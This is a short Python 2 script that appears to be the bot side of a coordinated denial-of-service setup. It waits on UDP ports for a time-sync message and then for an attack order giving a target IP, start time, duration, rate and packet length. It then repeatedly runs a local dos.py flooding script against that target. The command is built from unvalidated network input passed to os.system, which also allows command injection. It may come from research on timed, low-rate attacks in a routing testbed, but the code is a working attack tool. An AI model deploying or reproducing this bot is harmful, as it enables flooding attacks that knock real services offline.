# -*- coding: utf-8 -*-
"""
Created on Fri Oct 27 20:22:36 2017

@author: zyl
"""
import socket
import threading
import time
import os
def attack(ip,length,rate,per_attack_time):
    arg = 'python /home/quagga/dos.py' + ' ' + ip + ' ' + '-l ' + str(length) + ' ' + '-r ' + str(rate) + ' ' + '-s ' + str(per_attack_time) 
    os.system(arg)

def time_synchronization():
    port = 17112
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    #从指定的端口，从任何发送者，接收UDP数据
    s.bind(('',port))
    data,addr=s.recvfrom(1024)
    if data == 'time synchronization':
        ts = str(("%.3f" % time.time()))
        s.sendto(ts,addr)
    print 'time synchronization success.'
    s.close()

def begin_attack():
    port = 17111
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    #从指定的端口，从任何发送者，接收UDP数据
    s.bind(('',port))
    data,addr=s.recvfrom(1024)
    s.close()
    print('Received:',data,'from',addr)
    all_arg = data.split()
    ip = all_arg[0].split(':')[1]
    bot_start_time = float(all_arg[1].split(':')[1])
    sum_time = float(all_arg[2].split(':')[1])
    frequency = float(all_arg[3].split(':')[1])
    length = int(all_arg[4].split(':')[1])
    per_max = float(all_arg[5].split(':')[1])
    per_attack_time = int(all_arg[6].split(':')[1])
    rate = int((per_max * 1024 * 1024) /(8 * (42 + length)))
    if rate == 0:
        rate = 100
    start = bot_start_time
    end = 0
    while True:
        if ("%.2f" % time.time()) == ("%.2f" % bot_start_time):
            break
    attack(ip,length,rate,per_attack_time)
    while True:
        timer = threading.Timer(frequency/1000.0, attack, [ip,length,rate,per_attack_time])
        timer.start()
        timer.join()
        end = time.time()
        if (end - start) >= sum_time:
            break
    print('attack end.\n')
while True:
    time_synchronization()
    begin_attack()
